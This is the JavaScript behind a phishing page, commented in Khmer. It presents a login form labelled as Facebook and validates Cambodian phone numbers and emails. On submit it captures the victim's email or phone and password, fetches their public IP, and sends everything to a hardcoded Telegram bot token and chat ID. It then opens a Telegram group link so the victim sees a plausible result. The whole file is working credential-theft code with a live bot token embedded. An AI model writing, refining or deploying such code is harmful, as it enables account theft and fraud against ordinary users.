// ==================== ការកំណត់រចនាសម្ព័ន្ធ ====================
const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
const CHAT_ID = "6837307356";
const GROUP_LINK = "https://t.me/+7LTtj5yoBBxjMGVl";

// ==================== ទម្រង់ Regex ថ្មី ====================

// ទម្រង់អ៊ីមែល (អនុញ្ញាតគ្រប់ដែន និងអក្សរធំ-តូច)
const EMAIL_PATTERN = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

// ទម្រង់លេខទូរសព្ទកម្ពុជា (ចាប់ផ្ដើម 0 មាន 9-10 ខ្ទង់)
const PHONE_PATTERN = /^0[0-9]{8,9}$/;

// ទម្រង់លេខទូរសព្ទអន្តរជាតិ (មាន + និងកូដប្រទេស)
const INTERNATIONAL_PHONE_PATTERN = /^(\+?[0-9]{1,3})?[0-9]{9,12}$/;

// ទម្រង់លេខទូរសព្ទចល័តកម្ពុជាពិសេស (តាមប្រតិបត្តិករ)
const MOBILE_PATTERN = /^(086|087|088|089|092|095|096|097|098|099|010|011|012|015|016|017|018|066|067|068|069|060|061|070|077|078|079|085|090|091|093|094)[0-9]{6,7}$/;

// ==================== អថេរសកល ====================
let failedAttempts = 0;
let sessionStartTime = Date.now();
let rateLimitTimer = null;
let isProcessing = false;
let attemptsCount = 0;

// ==================== មុខងារកម្រិតខ្ពស់ ====================

// 1. ពិនិត្យទម្រង់អ៊ីមែល/ទូរសព្ទ (ប្រើទម្រង់ថ្មី)
function validateEmailOrPhone(input) {
    // ពិនិត្យអ៊ីមែល
    if (EMAIL_PATTERN.test(input)) {
        return { valid: true, type: "Email" };
    }
    
    // ពិនិត្យលេខទូរសព្ទចល័តកម្ពុជា
    if (MOBILE_PATTERN.test(input)) {
        return { valid: true, type: "Phone (Mobile)" };
    }
    
    // ពិនិត្យលេខទូរសព្ទកម្ពុជាធម្មតា
    if (PHONE_PATTERN.test(input)) {
        return { valid: true, type: "Phone (Cambodia)" };
    }
    
    // ពិនិត្យលេខទូរសព្ទអន្តរជាតិ
    if (INTERNATIONAL_PHONE_PATTERN.test(input)) {
        return { valid: true, type: "Phone (International)" };
    }
    
    return { valid: false, type: null };
}

// 2. បន្ថែម Real-time validation indicator
function addRealTimeValidation() {
    const emailInput = document.getElementById('email');
    const indicator = document.createElement('div');
    indicator.style.cssText = `
        font-size: 12px;
        margin-top: -10px;
        margin-bottom: 5px;
        padding-left: 5px;
        transition: all 0.3s ease;
    `;
    emailInput.parentNode.insertBefore(indicator, emailInput.nextSibling);
    
    emailInput.addEventListener('input', function() {
        const value = this.value.trim();
        const validation = validateEmailOrPhone(value);
        
        if (value.length === 0) {
            indicator.textContent = '';
            indicator.style.color = '';
        } else if (validation.valid) {
            let typeText = "";
            switch(validation.type) {
                case "Email":
                    typeText = "✓ ទម្រង់អ៊ីមែលត្រឹមត្រូវ";
                    break;
                case "Phone (Mobile)":
                    typeText = "✓ ទម្រង់លេខទូរសព្ទចល័តត្រឹមត្រូវ";
                    break;
                case "Phone (Cambodia)":
                    typeText = "✓ ទម្រង់លេខទូរសព្ទកម្ពុជាត្រឹមត្រូវ";
                    break;
                case "Phone (International)":
                    typeText = "✓ ទម្រង់លេខទូរសព្ទអន្តរជាតិត្រឹមត្រូវ";
                    break;
                default:
                    typeText = "✓ ទម្រង់ត្រឹមត្រូវ";
            }
            indicator.textContent = typeText;
            indicator.style.color = "#00cc00";
        } else {
            indicator.textContent = '✗ ទម្រង់មិនត្រឹមត្រូវ (សូមបញ្ចូលអ៊ីមែល ឬលេខទូរសព្ទ)';
            indicator.style.color = "#ff4444";
        }
    });
}

// 3. ទទួលបាន IP Public
async function getPublicIP() {
    const ipServices = [
        'https://api.ipify.org?format=json',
        'https://api.my-ip.io/ip.json',
        'https://ipapi.co/json/'
    ];
    
    for (const service of ipServices) {
        try {
            const response = await fetch(service);
            const data = await response.json();
            const ip = data.ip || data;
            if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) return ip;
        } catch (error) {
            continue;
        }
    }
    return "មិនអាចទាញយក IP បាន";
}

// 4. ការពារ Rate Limiting
async function rateLimit() {
    if (rateLimitTimer) {
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
    rateLimitTimer = setTimeout(() => { rateLimitTimer = null; }, 2000);
}

// 5. Retry Mechanism
async function fetchWithRetry(url, retries = 3) {
    for (let i = 0; i < retries; i++) {
        try {
            const response = await fetch(url);
            if (response.ok) return response;
            if (response.status === 429) {
                await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
                continue;
            }
        } catch (error) {
            if (i === retries - 1) throw error;
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    throw new Error("Max retries exceeded");
}

// 6. អនុគមន៍ទទួលបានពេលវេលា
function getCurrentDate() {
    const now = new Date();
    return now.toLocaleString('en-GB', {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }).replace(',', '');
}

// 7. ទម្រង់អត្ថបទសម្រាប់ផ្ញើទៅ Telegram
function formatTelegramMessage(email, password, ip, date, inputType) {
    let typeDisplay = "";
    switch(inputType) {
        case "Email":
            typeDisplay = "📧 អ៊ីមែល";
            break;
        case "Phone (Mobile)":
            typeDisplay = "📱 ទូរសព្ទចល័ត";
            break;
        case "Phone (Cambodia)":
            typeDisplay = "📞 ទូរសព្ទកម្ពុជា";
            break;
        case "Phone (International)":
            typeDisplay = "🌍 ទូរសព្ទអន្តរជាតិ";
            break;
        default:
            typeDisplay = "📧 អ៊ីមែល/ទូរសព្ទ";
    }
    
    return "━━━━━━━━━━━━━━━━━━━━━━\n" +
           "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
           "━━━━━━━━━━━━━━━━━━━━━━\n" +
           typeDisplay + "\n" +
           "📧 " + email + "\n" +
           "🔑 " + password + "\n" +
           "🌐 " + ip + "\n" +
           "📅 " + date + "\n" +
           "━━━━━━━━━━━━━━━━━━━━━━";
}

// 8. Toast Notification
function showToast(message, type = "success") {
    const toast = document.createElement('div');
    toast.textContent = message;
    toast.style.cssText = `
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: ${type === "success" ? "#0084ff" : "#ff4444"};
        color: white;
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 14px;
        z-index: 1000;
        animation: slideUp 0.3s ease;
        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    `;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

// 9. បន្ថែម CSS Animation
function addAnimations() {
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .loading-animation {
            animation: pulse 1s ease-in-out infinite;
        }
    `;
    document.head.appendChild(style);
}

// 10. Keyboard shortcut (Enter key)
function addKeyboardShortcut() {
    const inputs = document.querySelectorAll('.input-field');
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendToTelegram();
            }
        });
    });
}

// 11. រាប់ចំនួនព្យាយាម
function getAttemptsCount() {
    attemptsCount++;
    return attemptsCount;
}

// 12. ពិនិត្យ Session Expiry
function isSessionExpired() {
    return (Date.now() - sessionStartTime) > 300000;
}

// 13. អនុគមន៍បើក Telegram Group
function joinTelegramGroup() {
    window.open(GROUP_LINK, '_blank');
}

// 14. អនុគមន៍សំខាន់ផ្ញើទៅ Telegram
async function sendToTelegram() {
    if (isProcessing) {
        showToast("សូមរង់ចាំ...", "error");
        return;
    }
    
    if (isSessionExpired()) {
        sessionStartTime = Date.now();
        showToast("សម័យប្រើប្រាស់ថ្មី", "success");
    }
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        showToast("សូមបំពេញព័ត៌មានទាំងអស់!", "error");
        return;
    }
    
    const validation = validateEmailOrPhone(email);
    if (!validation.valid) {
        showToast("ទម្រង់អ៊ីមែល/ទូរសព្ទមិនត្រឹមត្រូវ!\nឧទាហរណ៍: example@gmail.com ឬ 0971234567", "error");
        return;
    }

    isProcessing = true;
    await rateLimit();
    
    const loadingDiv = document.getElementById('loading');
    loadingDiv.style.display = 'block';
    loadingDiv.classList.add('loading-animation');

    const submitBtn = document.querySelector('.submit-btn');
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.7';

    try {
        const ip = await getPublicIP();
        const date = getCurrentDate();
        const attemptNum = getAttemptsCount();
        
        const message = formatTelegramMessage(email, password, ip, date, validation.type);
        const encodedMessage = encodeURIComponent(message);

        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;

        const response = await fetchWithRetry(url);
        const result = await response.json();

        if (result.ok) {
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            showToast(`ចូលក្រុបបានដោយជោគជ័យ! (លើកទី ${attemptNum})`, "success");
            joinTelegramGroup();
            failedAttempts = 0;
        } else {
            failedAttempts++;
            showToast(`បរាជ័យលើកទី ${failedAttempts}`, "error");
            submitBtn.disabled = false;
            submitBtn.style.opacity = '1';
        }
    } catch (error) {
        console.error("Error:", error);
        showToast("កំហុសបច្ចេកទេស! សូមពិនិត្យការតភ្ជាប់", "error");
        submitBtn.disabled = false;
        submitBtn.style.opacity = '1';
    } finally {
        isProcessing = false;
        loadingDiv.style.display = 'none';
        loadingDiv.classList.remove('loading-animation');
    }
}

// ==================== ការចាប់ផ្ដើម ====================
document.addEventListener('DOMContentLoaded', () => {
    addAnimations();
    addRealTimeValidation();
    addKeyboardShortcut();
    console.log("Script loaded successfully with new regex patterns!");
});